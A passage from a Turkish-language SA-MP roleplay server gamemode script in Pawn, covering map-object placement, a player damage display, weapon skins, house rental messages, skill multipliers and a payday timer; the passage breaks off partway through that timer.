		CreatePlayerObject(playerid,1810, 805.26849, -1347.60413, -1.51240,   0.00000, 0.00000, -142.00000);
		CreatePlayerObject(playerid,10984, 803.00378, -1214.02563, 15.01530,   0.00000, 0.00000, 163.00000);
		//el corona
		RemoveBuildingForPlayer(playerid, 4969, 1932.4297, -2123.4063, 15.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 5019, 1936.4688, -2079.1094, 15.7266, 0.25);
		RemoveBuildingForPlayer(playerid, 5017, 1932.4297, -2123.4063, 15.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 5016, 1936.4688, -2079.1094, 15.7266, 0.25);
		RemoveBuildingForPlayer(playerid, 1413, 1935.1328, -2074.8672, 13.7266, 0.25);
		RemoveBuildingForPlayer(playerid, 1532, 1939.6016, -2116.7578, 12.6797, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1944.8047, -2110.2969, 15.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1912.6641, -2063.2109, 10.6563, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 1951.3750, -2039.6172, 12.6016, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 1972.1484, -2051.5938, 12.4063, 0.25);
		RemoveBuildingForPlayer(playerid, 3625, 1941.9844, -1970.7031, 14.9844, 0.25);
		CreatePlayerObject(playerid,5016, 1936.01782, -2077.91064, 17.25190,   2.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1929.72461, -2061.64404, 12.67024,   0.00000, 0.00000, 49.37180);
		CreatePlayerObject(playerid,10984, 1932.42981, -2083.97510, 13.13486,   0.00000, 0.00000, 297.08633);
		CreatePlayerObject(playerid,10984, 1950.09619, -2065.37817, 12.52798,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1945.53259, -2067.54126, 14.75542,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1943.74133, -2061.78979, 13.65537,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1935.75671, -2064.62231, 12.52798,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1938.86646, -2063.30103, 13.94608,   0.00000, 0.00000, 24.04370);
		CreatePlayerObject(playerid,10984, 1934.84192, -2056.40015, 12.56514,   0.00000, 0.00000, 17.52480);
		CreatePlayerObject(playerid,10984, 1950.18567, -2063.30713, 13.65537,   0.00000, 0.00000, 38.42007);
		CreatePlayerObject(playerid,10984, 1950.87244, -2068.33496, 13.65537,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1941.00452, -2072.05005, 13.65537,   0.00000, 0.00000, 101.60091);
		CreatePlayerObject(playerid,10984, 1929.64270, -2077.20825, 13.65537,   0.00000, 0.00000, 101.60091);
		CreatePlayerObject(playerid,10984, 1921.61414, -2079.03296, 13.65537,   0.00000, 0.00000, 261.73880);
		CreatePlayerObject(playerid,10984, 1922.88159, -2088.81934, 13.65537,   0.00000, 0.00000, 261.73880);
		CreatePlayerObject(playerid,10984, 1942.94165, -2111.13501, 12.38712,   0.00000, 0.00000, 1.01751);
		CreatePlayerObject(playerid,10984, 1933.32312, -2092.09277, 13.65537,   0.00000, 0.00000, 261.73880);
		CreatePlayerObject(playerid,5017, 1933.31677, -2118.16040, 15.65261,   156.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1923.85315, -2093.50439, 13.65537,   0.00000, 0.00000, 261.73880);
		CreatePlayerObject(playerid,10984, 1932.15259, -2111.60693, 12.38712,   0.00000, 0.00000, 274.35159);
		CreatePlayerObject(playerid,1308, 1951.21838, -2042.14221, 12.65600,   88.00000, 0.00000, 343.00000);
		CreatePlayerObject(playerid,1308, 1964.78223, -2049.37476, 12.27143,   88.00000, 0.00000, 307.60745);
		CreatePlayerObject(playerid,3625, 1948.29309, -1978.12085, 16.61700,   -16.00000, 0.00000, 313.00000);
		CreatePlayerObject(playerid,10984, 1943.94116, -1972.12073, 12.88222,   0.00000, 0.00000, 292.90549);
		CreatePlayerObject(playerid,10984, 1950.79919, -1985.28040, 13.16045,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1948.00098, -1978.33020, 12.88222,   0.00000, 0.00000, 288.46500);
		CreatePlayerObject(playerid,620, 1914.13879, -2063.33081, 12.41640,   -75.00000, 0.00000, 0.00000);
	    //frax
		RemoveBuildingForPlayer(playerid, 4025, 1777.8359, -1773.9063, 12.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 4075, 1791.7969, -1716.9844, 12.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 4077, 1781.4766, -1648.4219, 26.8359, 0.25);
		RemoveBuildingForPlayer(playerid, 4215, 1777.5547, -1775.0391, 36.7500, 0.25);
		RemoveBuildingForPlayer(playerid, 713, 1807.5156, -1625.8828, 12.7031, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 1538.5234, -1609.8047, 19.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 1805.0234, -1692.4453, 25.1484, 0.25);
		RemoveBuildingForPlayer(playerid, 4229, 1597.9063, -1699.7500, 30.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 4230, 1597.9063, -1699.7500, 30.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 1788.5078, -1816.5703, 13.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 1801.8828, -1817.3047, 13.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 4019, 1777.8359, -1773.9063, 12.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 4018, 1791.7969, -1716.9844, 12.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 1777.8516, -1677.1953, 14.3125, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 1805.0234, -1692.4453, 25.1484, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 1538.5234, -1609.8047, 19.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 4028, 1781.4766, -1648.4219, 26.8359, 0.25);
		RemoveBuildingForPlayer(playerid, 5541, 1822.8906, -1725.2578, 12.4688, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1817.5703, -1812.2266, 16.4219, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1825.7969, -1781.8438, 16.3438, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 1820.8359, -1741.1484, 15.5781, 0.25);
		RemoveBuildingForPlayer(playerid, 5502, 1822.8906, -1725.2578, 12.4688, 0.25);
		RemoveBuildingForPlayer(playerid, 1311, 1823.4219, -1647.2734, 16.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1817.5156, -1623.8359, 16.3594, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 1822.1563, -1623.5156, 15.6406, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 609.5469, -1875.0000, 5.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 553.3516, -1875.0000, 4.7891, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 498.4844, -1875.0000, 4.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 445.0313, -1875.0000, 3.7422, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 337.4531, -1875.0000, 3.4063, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 289.2266, -1875.0000, 3.2031, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 245.5391, -1875.0000, 2.6875, 0.25);
		RemoveBuildingForPlayer(playerid, 3778, 200.4844, -1875.0000, 3.0781, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 445.0313, -1875.0000, 3.7422, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 498.4844, -1875.0000, 4.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 553.3516, -1875.0000, 4.7891, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 609.5469, -1875.0000, 5.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 200.4844, -1875.0000, 3.0781, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 245.5391, -1875.0000, 2.6875, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 289.2266, -1875.0000, 3.2031, 0.25);
		RemoveBuildingForPlayer(playerid, 3615, 337.4531, -1875.0000, 3.4063, 0.25);
		CreatePlayerObject(playerid,3615, 246.36360, -1868.33594, 2.00231,   356.97879, 10.91998, -6.81841);
		CreatePlayerObject(playerid,3615, 202.98311, -1868.96228, 2.07667,   380.43832, -17.82000, 14.72159);
		CreatePlayerObject(playerid,3615, 288.43884, -1873.32275, 1.33518,   349.11850, -4.32000, 3.14159);
		CreatePlayerObject(playerid,3615, 569.81720, -1877.86719, 4.10497,   362.37811, 27.96000, 27.68160);
		CreatePlayerObject(playerid,3615, 496.54303, -1866.35803, 2.96127,   362.85815, -20.04000, 3.14159);
		CreatePlayerObject(playerid,3615, 445.14059, -1873.82983, 2.10451,   368.37851, -9.78000, -30.45840);
		CreatePlayerObject(playerid,3615, 335.86057, -1873.40015, 1.43743,   370.59842, -19.73999, 3.14159);
		CreatePlayerObject(playerid,1260, 1810.37207, -1689.69202, 15.85828,   2.42159, -57.05999, 215.24164);
		CreatePlayerObject(playerid,6234, 1827.92395, -1661.43665, 10.81314,   -0.54000, -0.42000, 0.00000);
		CreatePlayerObject(playerid,713, 1807.78894, -1628.32092, 12.72182,   43.62001, -24.00001, 0.00000);
		CreatePlayerObject(playerid,1311, 1824.83020, -1649.93262, 11.11764,   233.24156, -165.06012, 41.52000);
		CreatePlayerObject(playerid,6234, 1840.72400, -1631.41345, -5.20648,   0.66000, -105.60003, 0.00000);
		CreatePlayerObject(playerid,10166, 1807.15881, -1647.74768, 0.56688,   0.00000, 0.00000, 15.30001);
		CreatePlayerObject(playerid,1226, 1815.50500, -1626.97034, 11.78275,   79.94156, -26.22002, 0.00000);
		CreatePlayerObject(playerid,3865, 1827.01453, -1647.40161, 7.04211,   0.00000, 0.00000, 2.22000);
		CreatePlayerObject(playerid,3865, 1826.98706, -1640.61267, 5.65501,   -21.72001, -0.84000, 0.00000);
		CreatePlayerObject(playerid,17299, 1825.26453, -1638.91260, -7.38854,   0.00000, 0.00000, 29.09999);
		CreatePlayerObject(playerid,3865, 1826.00000, -1663.17957, 7.04211,   0.00000, 0.00000, 170.94006);
		CreatePlayerObject(playerid,3865, 1823.99792, -1673.58069, 7.04211,   0.00000, 0.00000, 201.12001);
		CreatePlayerObject(playerid,3865, 1825.76746, -1685.37378, 7.04211,   0.00000, 0.00000, 368.63995);
		CreatePlayerObject(playerid,17299, 1804.84473, -1651.28040, -0.74136,   0.00000, 0.00000, -48.60000);
		CreatePlayerObject(playerid,4028, 1779.71716, -1649.67822, 17.08542,   -142.47902, 173.88011, -46.74877);
		CreatePlayerObject(playerid,4018, 1794.38855, -1712.83142, 5.43825,   371.91827, -8.82000, 7.88158);
		CreatePlayerObject(playerid,17299, 1789.56323, -1708.66064, -2.90562,   0.00000, 0.00000, -240.78004);
		CreatePlayerObject(playerid,17299, 1766.70862, -1721.25781, -6.14335,   -0.06000, -2.82000, -408.83975);
		CreatePlayerObject(playerid,700, 1778.15479, -1677.23499, 14.36425,   324.15860, 25.62000, 3.14159);
		CreatePlayerObject(playerid,6234, 1827.26794, -1736.49609, 7.66581,   -0.18000, 10.26000, 0.00000);
		CreatePlayerObject(playerid,17028, 1797.42078, -1714.40210, -4.89895,   0.00000, 0.00000, 162.35983);
		CreatePlayerObject(playerid,6234, 1814.92383, -1747.59216, 9.70740,   -3.30000, 4.44000, -4.44000);
		CreatePlayerObject(playerid,3865, 1823.25159, -1719.36011, 7.07975,   0.00000, 0.00000, 170.94006);
		CreatePlayerObject(playerid,4019, 1770.70764, -1774.77905, -11.19569,   367.77802, 13.98000, -0.15841);
		CreatePlayerObject(playerid,6234, 1816.74158, -1782.99695, 0.27954,   -2.76000, -23.70000, -4.44000);
		CreatePlayerObject(playerid,6234, 1827.17358, -1782.93066, 8.81821,   -0.18000, 10.26000, 0.00000);
		CreatePlayerObject(playerid,17028, 1833.80212, -1809.36707, -6.82172,   0.00000, 0.00000, 249.29961);
		CreatePlayerObject(playerid,5026, 1822.79565, -1772.93591, 6.24605,   352.71823, 1.98000, -1.35841);
		CreatePlayerObject(playerid,898, 1816.87305, -1821.05383, 9.48408,   0.00000, 0.00000, 20.87998);
		CreatePlayerObject(playerid,898, 1806.90320, -1816.93835, 9.48408,   0.00000, 0.00000, -54.30002);
		CreatePlayerObject(playerid,700, 1800.17822, -1818.11719, 13.35156,   341.25934, -60.71992, 200.54155);
		CreatePlayerObject(playerid,700, 1785.96802, -1817.29968, 13.35156,   356.85840, 0.00000, 3.14159);
		CreatePlayerObject(playerid,3048, 1824.41919, -1745.61841, 7.99282,   15.72000, 2.58000, -49.73999);
		CreatePlayerObject(playerid,3048, 1824.69836, -1730.05920, 6.16958,   15.72000, 2.58000, -101.04002);
		CreatePlayerObject(playerid,852, 1831.21179, -1742.67798, 12.54346,   0.00000, 0.00000, 49.62000);
		CreatePlayerObject(playerid,852, 1830.76538, -1741.56934, 12.54346,   0.00000, 0.00000, 95.22002);
		CreatePlayerObject(playerid,852, 1809.89343, -1746.16211, 12.54346,   0.00000, 0.00000, -50.81998);
		CreatePlayerObject(playerid,852, 1810.08789, -1748.24951, 12.54346,   0.00000, 0.00000, -50.81998);
		CreatePlayerObject(playerid,6234, 1828.58032, -1687.80383, -7.05371,   3.36000, -66.54005, 0.18000);
		CreatePlayerObject(playerid,3976, 1571.60156, -1675.75000, 35.67969,   356.85840, 0.00000, 3.14159);
		CreatePlayerObject(playerid,1260, 1539.61865, -1615.57361, 17.04251,   362.61804, -43.08004, 34.88160);
	}*/
DeleteSnow(playerid)
{
	if(!snowOn[playerid]) return 0;
    for(new i = 0; i < MAX_SNOW_OBJECTS; i++) DestroyDynamicObject(snowObject[playerid][i]);
    KillTimer(updateTimer[playerid]);
    snowOn[playerid] = false;
    return 1;
}

stock GetWeaponNameEx(weaponid)
{
	new weapon[22];
    switch(weaponid)
    {
    	case 0: weapon = "Fist";
        case 18: weapon = "Molotov Cocktail";
        case 44: weapon = "Night Vision Goggles";
        case 45: weapon = "Thermal Goggles";
        case 54: weapon = "Düþüþ";
        default: GetWeaponName(weaponid, weapon, sizeof(weapon));
    }
    return weapon;
}

DisplayDamages(toplayer, playerid)
{
	new playername[MAX_PLAYER_NAME], title[45];
    GetPlayerName(playerid, playername, sizeof(playername));
    format(title, sizeof(title), "%s isimli kiþinin yaralanmalarý", playername);
    if(!CountDamages(playerid)) return ShowPlayerDialog(toplayer, D_DAMAGES, DIALOG_STYLE_LIST, title, "Gösterilecek bir yara yok...", ">>>", "");
    new gText[1000], fstr[45];
    for(new i = 0; i < MAX_BODY_PARTS; i++)
    {
    	for(new z = 0; z < MAX_WEAPONS; z++)
		{
  			if(!Damage1[playerid][i][z]) continue;
     		switch(i)
       		{
         		case 0 .. 15: format(fstr, sizeof(fstr), "%d vuruþ %s ile %s bölgesine\n", Damage1[playerid][i][z], GetWeaponNameEx(z), GetBodyPartName(i + 3));
                case 54: format(fstr, sizeof(fstr), "%d %s üzerine düþtü\n", Damage1[playerid][i][z], GetBodyPartName(i));
                default: format(fstr, sizeof(fstr), "%d mermi %s ile %s bölgesine\n", Damage1[playerid][i][z], GetWeaponNameEx(z), GetBodyPartName(i + 3));
           	}
            strcat(gText, fstr);
		}
  	}
    ShowPlayerDialog(toplayer, D_DAMAGES, DIALOG_STYLE_LIST, title, gText, "Kapat", "");
    return 1;
}

forward UpdateSnow(playerid);
public UpdateSnow(playerid)
{
	if(!snowOn[playerid]) return 0;
    new Float:pPos[3];
    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
    for(new i = 0; i < MAX_SNOW_OBJECTS; i++) SetDynamicObjectPos(snowObject[playerid][i], pPos[0] + random(25), pPos[1] + random(25), pPos[2] - 5 + random(10));
    return 1;
}

ResetDamages(playerid)
{
    for(new i = 0; i < MAX_BODY_PARTS; i++)
    {
        for(new z = 0; z < MAX_WEAPONS; z++) Damage1[playerid][i][z] = 0;
    }
	return 1;
}

CountDamages(playerid)
{
    new count = 0;
    for(new i = 0; i < MAX_BODY_PARTS; i++)
	{
		for(new z = 0; z < MAX_WEAPONS; z++)
        {
        	if(Damage1[playerid][i][z]) count += Damage1[playerid][i][z];
    	}
    }
	return count;
}

GetBodyPartName(bodypart)
{
    new part[11];
    switch(bodypart)
	{
        case BODY_PART_TORSO: part = "GÖÐÜS";
        case BODY_PART_GROIN: part = "KASIK";
        case BODY_PART_LEFT_ARM: part = "SOL KOL";
        case BODY_PART_RIGHT_ARM: part = "SAÐ KOL";
        case BODY_PART_LEFT_LEG: part = "SOL BACAK";
        case BODY_PART_RIGHT_LEG: part = "SAÐ BACAK";
        case BODY_PART_HEAD: part = "KAFA";
    	default: part = "NONE";
    }
	return part;
}

SQLCheckSkin(_sqlid, skinname[]){
	new _result=0,query[128];
	format(query, sizeof(query), "SELECT `%s` FROM `skins` WHERE `sqlID` = '%d';",skinname, _sqlid);
	new Cache:result = mysql_query(query,true);
	if(cache_num_rows()) _result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

GetGunSkinName(modelid) {
	new string[88];
	for(new i=0;i<sizeof(GunSkinsNames);i++) {
		if(GunSkinsNames[i][ID] == modelid) {
			format(string, sizeof(string), "%s", GunSkinsNames[i][Name]);
			break;
		}
	}
	return string;
}

GetGunName(modelid) {
	new string[88];
	for(new i=0;i<sizeof(GunNames);i++) {
		if(GunNames[i][ID] == modelid) {
			format(string, sizeof(string), "%s", GunNames[i][Name]);
			break;
		}
	}
	return string;
}

GetGunSQLName(modelid) {
	new string[64];
	for(new i=0;i<sizeof(GunSQLNames);i++) {
		if(GunSQLNames[i][ID] == modelid) {
			format(string, sizeof(string), "%s", GunSQLNames[i][Name]);
			break;
		}
	}
	return string;
}

CMD:skinsec(playerid, params[]) {
	if(!Girdi[playerid]) return 1;
	new mstring[1024];
	mstring = "Silah\tSkin\n";
	for(new i=0;i<sizeof(GunSkins);i++) {
		format(mstring, sizeof(mstring), "%s{F9F9F9}%s\t{FA4A4E}%s\n", mstring, GetGunName(GunSkins[i][0]), GetGunSkinName(Karakter[playerid][SilahSkin][GunSkins[i][0]]));
	}
	ShowPlayerDialog(playerid, 449, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Silah Seç", mstring, "Seç", "Ýptal");
	return 1;
}


HafifSilah(_silahid) {
	for(new i=0;i<sizeof(hafif_silahlar);i++) {
		if(_silahid == hafif_silahlar[i]) return 1;
	}
	return 0;
}

AgirSilah(_silahid) {
	for(new i=0;i<sizeof(agir_silahlar);i++) {
		if(_silahid == agir_silahlar[i]) return 1;
	}
	return 0;
}

HafifSilahVar(playerid) {
	foreach(new i : Guns) {
	    for(new j=0;j<sizeof(hafif_silahlar);j++) {
			if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid] && OyuncuSilah[i][durum] == 1 && OyuncuSilah[i][silahid] == hafif_silahlar[j]) return 1;
		}
	}
	return 0;
}

AgirSilahVar(playerid) {
	foreach(new i : Guns) {
	    for(new j=0;j<sizeof(agir_silahlar);j++) {
			if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid] && OyuncuSilah[i][durum] == 1 && OyuncuSilah[i][silahid] == agir_silahlar[j]) return 1;
		}
	}
	return 0;
}

public OnPlayerExitColouredCheckpoint(playerid, cpid) {
    EvCheckpointYazi[playerid] = 1;
	return 1;
}

public OnPlayerEnterColouredCheckpoint(playerid, cpid) {
    if(EvCheckpointYazi[playerid])
	{
	    new _evid;
	    foreach(new i : Houses)
	    {
	        if(cpid == Ev[i][ecp] && Ev[i][girisX] != 0 && Ev[i][girisY] != 0 && Ev[i][girisZ] != 0)
	        {
	            _evid = i;
	            break;
	        }
	    }
	    new _adres[64];
		format(_adres, sizeof(_adres), "%s %d",GetLocation(Ev[_evid][girisX],Ev[_evid][girisY],Ev[_evid][girisZ]), _evid);
	    new string[256];
	    if(Ev[_evid][esahip] != -1 && Ev[_evid][kira] == 0)
	    {
			format(string, sizeof(string), "{5bc0de}Þu anda %s'nýn kapýsýnda duruyorsunuz. - Adres: %s", SQLFromName(Ev[_evid][esahip]),_adres);
			SendClientMessage(playerid, -1, string);
			SendClientMessage(playerid, -1, "Kullanýlabilir komutlar: giriþ/çýkýþ için Y tuþu");
		}
		else if(Ev[_evid][esahip] == -1 && Ev[_evid][kira] == 0)
		{
		    format(string, sizeof(string), "{5bc0de}Bu evin sahibi yoktur. Satýn almak için (/satinal) (Fiyat:%d$)", Ev[_evid][efiyat]);
		    SendClientMessage(playerid, -1, string);
		    SendClientMessage(playerid, -1, "Kullanýlabilir komutlar: giriþ/çýkýþ için Y tuþu");
		}
		else if(Ev[_evid][kira] == 1 && Ev[_evid][kiralayan] == -1)
		{
		    format(string, sizeof(string), "{5bc0de}Bu ev kiralýk durumda. Evi kiralamak istiyorsanýz ''/evkirala''");
		    SendClientMessage(playerid, -1, string);
		    format(string, sizeof(string), "{5bc0de}Ev sahibi: %s - Adres: %s", SQLFromName(Ev[_evid][esahip]),_adres);
		    SendClientMessage(playerid, -1, string);
		    format(string, sizeof(string), "{5bc0de}Ev kira fiyatý: %d$", Ev[_evid][kirafiyat]);
		    SendClientMessage(playerid, -1, string);
		}
		else if(Ev[_evid][kira] == 1 && Ev[_evid][kiralayan] != -1)
		{
		    format(string, sizeof(string), "{5bc0de}Ev sahibi: %s - Adres: %s", SQLFromName(Ev[_evid][esahip]),_adres);
		    SendClientMessage(playerid, -1, string);
		    format(string, sizeof(string), "{5bc0de}Bu ev %s tarafýndan kiralanmýþ durumda.", SQLFromName(Ev[_evid][kiralayan]));
		    SendClientMessage(playerid, -1, string);
		    SendClientMessage(playerid, -1, "Kullanýlabilir komutlar: giriþ/çýkýþ için Y tuþu");
		}
		EvCheckpointYazi[playerid] = 0;
		return 1;
	}
	return 1;
}

SQLGetFactionUsers(_sqlid){
	new _result=0,query[128];
	format(query, sizeof(query), "SELECT COUNT(*) FROM `karakterler` WHERE `birlik` = '%d' AND `kilit` = '0'", _sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

CMD:ozellikgelistir(playerid) {
	new nstring[64], mstring[1024];
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Özellik Geliþtir ["C7"%d"C8"]", Karakter[playerid][ozellik]);
	format(mstring, sizeof(mstring), "Özellik\tSeviye\n"NOKTA" "C2"Liderlik\t["C1"%d"C2"]\n"NOKTA" "C2"Güç\t["C1"%d"C2"]\n"NOKTA" "C2"Pazarlýk\t["C1"%d"C2"]\n"NOKTA" "C2"Ustalýk\t["C1"%d"C2"] \
	\n"NOKTA" "C2"Niþancýlýk\t["C1"PASÝF"C2"]\n"NOKTA" "C2"Çeviklik\t["C1"PASÝF"C2"]",
	    KarakterOzellik[playerid][Liderlik], KarakterOzellik[playerid][Guc], KarakterOzellik[playerid][Pazarlik], KarakterOzellik[playerid][Ustalik]);
	ShowPlayerDialog(playerid, 451, DIALOG_STYLE_TABLIST_HEADERS, nstring, mstring, "Seç", "Ýptal");
	return 1;
}

forward Float:UstalikKatSayi(playerid);
stock Float:UstalikKatSayi(playerid) {
	new mstring[8];
	if(KarakterOzellik[playerid][Ustalik] == 10) format(mstring, sizeof(mstring), "0.1");
	else format(mstring, sizeof(mstring), "0.0%d", KarakterOzellik[playerid][Ustalik]);
	new Float:var = floatstr(mstring);
	return (1+var);
}

forward Float:PazarlikKatSayi(playerid);
stock Float:PazarlikKatSayi(playerid) {
	new mstring[8];
	if(KarakterOzellik[playerid][Pazarlik] == 10) format(mstring, sizeof(mstring), "0.1");
	else format(mstring, sizeof(mstring), "0.0%d", KarakterOzellik[playerid][Pazarlik]);
	new Float:var = floatstr(mstring);
	return (1-var);
}

forward OyuncuOzellikSifirla(playerid);
public OyuncuOzellikSifirla(playerid) {
	KarakterOzellik[playerid][Liderlik] = 0;
	KarakterOzellik[playerid][Guc] = 0;
	KarakterOzellik[playerid][Ustalik] = 0;
	KarakterOzellik[playerid][Pazarlik] = 0;
	Karakter[playerid][ozellik] = Karakter[playerid][level]-1;
}

IsyeriPayday(playerid, iyy) {
	if(Isyeri[iyy][isahip] == Karakter[playerid][sqlid] && Isyeri[iyy][kiralayan] == -1) return 1;
	if(Isyeri[iyy][kiralayan] == Karakter[playerid][sqlid]) return 1;
	return 0;
}

CMD:suresifirla(playerid) {
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5) return 1;
	foreach(new i : Player) {
		Karakter[i][oyunsure] = 0;
		KarakterKaydet(i);
	}
	mysql_tquery(1,"UPDATE `karakterler` SET `oyunsure` = '0'");
	Bilgi(playerid, "Tüm oyuncularýn süresini sýfýrladýnýz.");
	return 1;
}

CMD:silahal(playerid) {
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] != MAFYA && Birlik[Karakter[playerid][birlik]][ftip] != YARIS && Birlik[Karakter[playerid][birlik]][ftip] != CETE && Birlik[Karakter[playerid][birlik]][ftip] != MC) return Hata(playerid, "Bu komutu kullanamazsýnýz.");
	if(Karakter[playerid][silahpayday] > 0) return Hata(playerid, "Silahýnýz yapým aþamasýnda.");
	if(Karakter[playerid][silahuretimid] == 0) return Hata(playerid, "Silah yapmaya baþlamamýþsýnýz.");
	SilahFab(playerid, Karakter[playerid][silahuretimid], 0);
	Karakter[playerid][silahuretimid] = 0;
	KarakterKaydet(playerid);
	return 1;
}

ptask OyuncuTimer[60000](playerid)
{
		    if(Girdi[playerid] && IsPlayerConnected(playerid))
		    {
                AFK[playerid] = true;
			    new levelup = Karakter[playerid][level]*4;
			    new maas=0, sex=0,sex2=0,idd,iddd,string[128];
			    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
	    		{
		    		if(Karakter[playerid][medisbasi] == 1 || Karakter[playerid][fdisbasi] == 1 || Karakter[playerid][isbasi] == 1)
					{
					    if(Karakter[playerid][rutbe] == 1) maas = Birlik[Karakter[playerid][birlik]][rutbe1maas];
					    if(Karakter[playerid][rutbe] == 2) maas = Birlik[Karakter[playerid][birlik]][rutbe2maas];
					    if(Karakter[playerid][rutbe] == 3) maas = Birlik[Karakter[playerid][birlik]][rutbe3maas];
					    if(Karakter[playerid][rutbe] == 4) maas = Birlik[Karakter[playerid][birlik]][rutbe4maas];
					    if(Karakter[playerid][rutbe] == 5) maas = Birlik[Karakter[playerid][birlik]][rutbe5maas];
					    if(Karakter[playerid][rutbe] == 6) maas = Birlik[Karakter[playerid][birlik]][rutbe6maas];
					    if(Karakter[playerid][rutbe] == 7) maas = Birlik[Karakter[playerid][birlik]][rutbe7maas];
					    if(Karakter[playerid][rutbe] == 8) maas = Birlik[Karakter[playerid][birlik]][rutbe8maas];
					    if(Karakter[playerid][rutbe] == 9) maas = Birlik[Karakter[playerid][birlik]][rutbe9maas];
					    if(Karakter[playerid][rutbe] == 10) maas = Birlik[Karakter[playerid][birlik]][rutbe10maas];
					    if(Karakter[playerid][rutbe] == 11) maas = Birlik[Karakter[playerid][birlik]][rutbe11maas];
					    if(Karakter[playerid][rutbe] == 12) maas = Birlik[Karakter[playerid][birlik]][rutbe12maas];
					    if(Karakter[playerid][rutbe] == 13) maas = Birlik[Karakter[playerid][birlik]][rutbe13maas];
					    if(Karakter[playerid][rutbe] == 14) maas = Birlik[Karakter[playerid][birlik]][rutbe14maas];
					    if(Karakter[playerid][rutbe] == 15) maas = Birlik[Karakter[playerid][birlik]][rutbe15maas];
					    if(Karakter[playerid][rutbe] == 16) maas = Birlik[Karakter[playerid][birlik]][rutbe16maas];
					    if(Karakter[playerid][rutbe] == 17) maas = Birlik[Karakter[playerid][birlik]][rutbe17maas];
					    if(Karakter[playerid][rutbe] == 18) maas = Birlik[Karakter[playerid][birlik]][rutbe18maas];
					    if(Karakter[playerid][rutbe] == 19) maas = Birlik[Karakter[playerid][birlik]][rutbe19maas];
					    if(Karakter[playerid][rutbe] == 20) maas = Birlik[Karakter[playerid][birlik]][rutbe20maas];
	    			}
					else maas = 0;
				}
				else {
					if(Karakter[playerid][rutbe] == 1) maas = Birlik[Karakter[playerid][birlik]][rutbe1maas];
				    if(Karakter[playerid][rutbe] == 2) maas = Birlik[Karakter[playerid][birlik]][rutbe2maas];
				    if(Karakter[playerid][rutbe] == 3) maas = Birlik[Karakter[playerid][birlik]][rutbe3maas];
				    if(Karakter[playerid][rutbe] == 4) maas = Birlik[Karakter[playerid][birlik]][rutbe4maas];
				    if(Karakter[playerid][rutbe] == 5) maas = Birlik[Karakter[playerid][birlik]][rutbe5maas];
				    if(Karakter[playerid][rutbe] == 6) maas = Birlik[Karakter[playerid][birlik]][rutbe6maas];
				    if(Karakter[playerid][rutbe] == 7) maas = Birlik[Karakter[playerid][birlik]][rutbe7maas];
				    if(Karakter[playerid][rutbe] == 8) maas = Birlik[Karakter[playerid][birlik]][rutbe8maas];
				    if(Karakter[playerid][rutbe] == 9) maas = Birlik[Karakter[playerid][birlik]][rutbe9maas];
				    if(Karakter[playerid][rutbe] == 10) maas = Birlik[Karakter[playerid][birlik]][rutbe10maas];
				    if(Karakter[playerid][rutbe] == 11) maas = Birlik[Karakter[playerid][birlik]][rutbe11maas];
				    if(Karakter[playerid][rutbe] == 12) maas = Birlik[Karakter[playerid][birlik]][rutbe12maas];
				    if(Karakter[playerid][rutbe] == 13) maas = Birlik[Karakter[playerid][birlik]][rutbe13maas];
